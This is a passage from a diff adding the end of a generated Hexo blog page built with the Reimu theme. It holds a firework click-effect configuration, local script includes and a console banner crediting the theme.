+    firework(JSON.parse('{"excludeElements":["a"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.1.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
